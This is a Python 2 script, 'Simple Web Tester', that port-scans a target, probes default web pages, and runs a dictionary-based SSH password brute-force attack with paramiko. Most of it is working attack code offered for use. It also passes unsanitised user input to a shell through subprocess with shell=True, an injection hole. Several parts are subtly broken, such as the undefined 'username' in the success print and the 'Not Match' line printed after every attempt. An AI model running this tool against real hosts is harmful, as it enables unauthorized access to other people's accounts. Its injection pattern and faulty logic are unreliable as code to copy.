#!/Users/Luna/.pyenv/versions/2.7.10/envs/mdev-py-2.7.10/bin/python2.7 
#coding: utf-8

#####################################################################
#                                                                   #
#   Simple Web Tester v1.1                                          #
#   Edited by lullaby1una                                           #
#               2017.03.24                                          #
#                                                                   #
#####################################################################

import os, sys
import argparse
import textwrap
import socket
import subprocess
import paramiko
import httplib
import urllib2
import time
import logging

class Logger(object):
    def __init__(self):
        if os.path.exists('Result_Report'):
            os.unlink('Result_Report')
        self.terminal = sys.stdout
        self.log = open('Result_Report', 'a')

    def write(self, message):
        self.terminal.write(message)
        self.log.write(message)

    def flush(self):
        pass 

sys.stdout = Logger()

global usrname, dicfile, line
global bool_ssh, bool_web

def pathExporter(cmd):
    return subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).communicate()[0].decode('utf-8')

def file_write(fp, buf):
    try:
        fp.write(str(buf))
    except:
        print 'Error Occured ; File Write.'
        sys.exit(2)

def ssh_connection(password, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(opts.host_name, port=22, username=usrname, password=password)
    except paramiko.AuthenticationException:
        ###TODO Auth Fail
        code = 1
    except socket.error, e:
        ###TODO Conn Fail
        code = 2

    ssh.close()
    return code

#define path
#print os.chdir(os.path.curdir)

#define args
args = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,
        description=textwrap.dedent('''\
                Simple Web Tester v1.0
                -----------------------------------------------------------------------------------------------
                1   Port Scan               21 22 23 80 443 3306
                2   Search Default Page     If port 80 open, search default-page # use option  --search-default
                3   Brute Force SSH         If port 22 open, execute brute-force # use option  --brute-force
                '''))

args.add_argument('-T', dest='host_name', help='Target Hostname', required=True)
args.add_argument('--search-default', dest='sw_search', action='store_true', help='Search the default page when port 80 is opened', required=False)
args.add_argument('--brute-force', dest='sw_brute', action='store_true', help='Execute the Brute-Force attack when port 22 is opened', required=False)
args.add_argument('-s','--save', dest='sw_save',action='store_true', help='Save to file.\t\tADD AT v2.0', required=False)

#no input required arg
opts = args.parse_args()

if not opts.host_name:
    print '\n\n'
    print args.print_help()
    print '\n\n'

    raise Exception('Required Argument Missing.')
    print '%s Program Halted.' %promptstring

#save switch on (by Argument)
if opts.sw_save:
    #TODO if final array has '/' erase routine
    usrpath = raw_input("Input Directory To save result :")
    filecmd = "touch " + usrpath + "/tmp"
    print pathExporter(filecmd)


###TODO Testing args
#print opts.sw_search
#print opts.sw_brute


#port Scanning
port_list = [21,22,23,80,443,3306]
host_ip = socket.gethostbyname(opts.host_name)
bool_ssh = False
bool_web = False

print '-' * 70
print 'Simple Web Tester v1.0'
print '-' * 70
print 'Now you are checking the...'
print '\tHost\t%s' %opts.host_name
print '\tHost_IP\t%s\n' %host_ip

print 'Checking opened port for...'
try:
    for port in port_list:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        scanned_result = s.connect_ex((host_ip, port))

        if scanned_result == 0:
            if port == 22:
                bool_ssh = True
            if port == 80:
                bool_web = True

            print '\tPORT {:4}'.format(port)

        s.close()

except KeyboardInterrupt:
    sys.exit(2)
except socket.gaierror:
    print 'Hostname cannot be resolved.'
    sys.exit(2)
except socket.error:
    print 'Cannot connect to Server.'
    sys.exit(2)
print 'Port scanning Completed.'


#Default Page
if opts.sw_search and bool_web:
    print '-'*70
    print 'Searching for Default Pages at 80(web).'
    fp_d = open('./defaultpages', 'r')
    line = fp_d.readline()
    
    if os.path.exists('./200'):
        os.unlink('./200')
    if os.path.exists('./403'):
        os.unlink('./403')
    if os.path.exists('./not_Found'):
        os.unlink('./not_Found')


    while line:
        line = line.replace('\n', '')
        web = "http://" + opts.host_name + line

        time.sleep(1)
        conn = httplib.HTTPConnection(opts.host_name)
        conn.request("GET", web)
        response = conn.getresponse()
        if response.status == 200:
            w = file('200', 'a')
            w.write(line+'\n')
            print web + '\t\t200 OK'
        elif response.status == 403:
            w = file('403', 'a')
            w.write(line+'\n')
            print '403 forbidden'
        else:
            w = file('not_Found', 'a')
            w.write(line+'\n')
        line = fp_d.readline()
        
    fp_d.close()

#SSH BRUTE FORCE    
if opts.sw_brute and bool_ssh:
    print '-'*70    
    print 'execute the Brute-Force Attack'    
    usrname = raw_input('\tEnter SSH username\t:')
    dicfile = raw_input('\tEnter DiC file path\t:')

    fp = open(dicfile)
    if not os.path.exists(dicfile):
        print 'DICTIONARY FILE NOT EXITST.'

    for i in fp.readlines():
        password = i.strip("\n")
        try:
            response = ssh_connection(password)

            if response == 0:
                print 'USER\tPW\t\t'
                print '%s\t%s' % (username,password)
            elif response == 2:
                print 'unable to connect to SSH'
        except Exception, e:
            print e
            pass
        print password + ' - Not Match'
    fp.close()
